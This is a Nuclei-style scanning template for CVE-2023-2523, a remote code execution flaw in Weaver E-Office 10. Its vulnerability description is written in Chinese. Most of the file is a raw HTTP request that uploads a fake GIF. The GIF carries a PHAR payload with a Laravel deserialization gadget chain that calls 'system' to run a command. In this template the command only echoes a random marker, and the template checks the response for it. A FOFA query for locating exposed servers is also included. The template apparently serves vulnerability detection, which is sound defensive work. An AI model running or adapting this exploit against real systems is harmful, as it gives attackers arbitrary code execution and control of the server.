id: CVE-2023-2523

info:
  name: 泛微 E-Office 10 远程代码执行漏洞
  author: pork
  severity: critical
  description: |
    泛微 E-Office (v10.0_20180516 < E-Office10 < v10.0_20240222) 存在远程代码执行漏洞，攻击者可通过构造PHAR文件后上传，通过反序列化执行任意代码，可利用此漏洞获取到系统的控制权限。
  metadata:
    verified: true
    max-request: 2
    fofa-query: app="泛微-EOffice"
  tags: cve,weaver,php,rce,oa
variables:
  str1: "{{rand_base(32)}}"
  str2: "{{base64(str1)}}"

http:
  - raw:
      - |
        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Go-http-client/1.1
        Content-Length: 523
        Accept: string("*/*")
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=ifedjiqy
        
        --ifedjiqy
        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
        Content-Type: image/jpeg
        GIF89a<?php __HALT_COMPILER(); ?>

        D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:49:"echo base64_encode('{{str1}}')";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
        --ifedjiqy--

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'body == str2'
        condition: and
